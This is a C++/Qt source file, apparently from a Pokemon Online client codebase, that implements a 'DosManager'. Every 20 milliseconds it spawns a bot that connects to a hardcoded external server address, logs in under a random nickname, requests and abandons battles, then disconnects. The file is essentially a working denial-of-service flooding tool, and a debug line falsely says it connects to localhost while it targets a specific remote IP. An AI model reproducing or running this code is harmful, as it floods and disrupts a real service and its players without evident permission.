#include "arg.h"
#include "../PokemonInfo/battlestructs.h"

DosManager::DosManager()
{
    t.start(20,this);
}

void DosManager::timerEvent(QTimerEvent *)
{
    IOManager *m = new IOManager();
    connect(m, SIGNAL(disconnected()), SLOT(removeStuff()));
    bots.insert(m);
    qDebug() << "added , " << bots.size();
}

void DosManager::removeStuff()
{
    qDebug() << "removing, " << bots.size();
    ((IOManager*)sender())->deleteLater();
    bots.remove((IOManager*)sender());
    qDebug() << "removed, " << bots.size();
}

IOManager::IOManager()
{
    a = new Analyzer(false);
    qDebug() << "Connecting to localhost";

    count = 0;

    connect(a, SIGNAL(connected()), SLOT(connectionEstablished()));
    connect(a, SIGNAL(disconnected()), SLOT(goodToDelete()));
    on = true;
    a->connectTo("91.121.73.228", 5070);
}

IOManager::~IOManager()
{
    qDebug() << "Deleting bot";
    a->deleteLater();
}

void IOManager::goodToDelete()
{
    qDebug() << "Disconnected";
    emit disconnected();
    on = false;
}

void IOManager::connectionEstablished()
{
    qDebug() << "Connection established";

    TrainerTeam t;
    qDebug() << "..";
    t.loadFromFile("trainer.tp");

    qDebug() << "Team set";

    QString nick;
    for (int i = 0; i < 4; i++) {
        nick.append( char(( (rand()+clock()) %2) ? 'A' + ((rand()+clock()) % 26) : 'a' + ( (rand()+clock()) % 26)));
    }

    t.setTrainerNick(nick);

    FullInfo f = {t, true,true,Qt::black};

    a->login(f);

    this->t.start((rand()%10 + 1)*40000,this);
    qDebug() << "End connection established";
}

void IOManager::timerEvent(QTimerEvent *)
{
    count ++;

    qDebug() << "timeout";

    switch (count) {
    case 1: {
        qDebug() << "Finding battle";
        FindBattleData d;
        d.mode = 0;
        d.range = 1000;
        d.ranged = false;
        d.rated = false;
        d.sameTier = false;
        a->notify(NetworkCli::FindBattle, d);
        break;
    }
    case 2:
        if (rand()%4 != 0) {
            qDebug() << "Ending battle";
            a->notify(NetworkCli::BattleFinished);
            break;
        }
    default:
        qDebug() << "Hem";
        on = false;
        emit disconnected();
    }
}
